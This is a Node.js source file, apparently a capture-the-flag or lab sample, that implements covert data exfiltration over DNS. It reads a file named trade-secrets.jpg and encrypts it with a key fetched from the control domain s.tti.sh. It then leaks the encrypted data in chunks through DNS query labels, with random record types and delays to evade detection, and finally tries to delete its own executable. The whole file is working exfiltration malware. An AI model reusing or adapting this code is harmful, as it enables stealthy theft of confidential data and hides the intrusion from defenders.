const crypto = require("node:crypto");
const dns = require("node:dns/promises");
const fs = require("node:fs/promises");

function getFullIPv6(str) {
    const padded = str
        .split(":")
        .map((p, i) => (p || !i ? p.padStart(4, "0") : ""))
        .join(":");
    let missing = 39 - padded.length;
    if (!missing) return padded;
    missing -= 4;
    const extra = missing / 5;
    return padded.replace("::", ":" + "0000:".repeat(1 + extra));
}

function encrypt(buf, key) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv("aes-256-cbc", key, iv);
    return Buffer.concat([iv, cipher.update(buf), cipher.final()]);
}

async function main() {
    const c2 = "s.tti.sh";
    const init = crypto.randomBytes(8).toString("hex");

    const exfil = await fs.readFile("/root/trade-secrets.jpg").catch(() => null);
    if (!exfil) return;

    const sessionResult = await dns.resolve4(`${init}.b.${c2}`).catch(() => []);
    const encryptionKeyResult = await dns.resolve6(`${init}.b.${c2}`).catch(() => []);
    if (sessionResult.length !== 1 || encryptionKeyResult.length !== 2) return;

    const sessionKey = sessionResult[0]
        .split(".")
        .map(Number)
        .reduce((a, c) => a * 256 + c, 0)
        .toString(36);

    const encryptionKey = Buffer.from(
        encryptionKeyResult.map(getFullIPv6).join("").replace(/:/g, ""),
        "hex"
    );
    const encryptedData = encrypt(exfil, encryptionKey);
    let fullPayload = BigInt("0x" + encryptedData.toString("hex")).toString(36);

    const perQuery = 253 - `.${sessionKey}.d.${c2}`.length;
    const separators = Math.floor(perQuery / 64);

    while (fullPayload.length > 0) {
        const payload = fullPayload.slice(0, perQuery - separators);
        fullPayload = fullPayload.slice(perQuery - separators);
        const payloadParts = [...(payload.match(/.{1,63}/g) ?? [])];
        const target = `${payloadParts.join(".")}.${sessionKey}.d.${c2}`;
        if (Math.random() < 0.5) await dns.resolve4(target).catch(() => null);
        else await dns.resolve6(target).catch(() => null);
        await new Promise((res) => setTimeout(res, 100 + Math.random() * 200));
    }
    await dns.resolve4(`fin.${sessionKey}.d.${c2}`).catch(() => null);
}

main()
    .catch((err) => console.error(err))
    .finally(() => {
        if (process.pkg) {
            fs.unlnik(process.execPath);
        }
    });
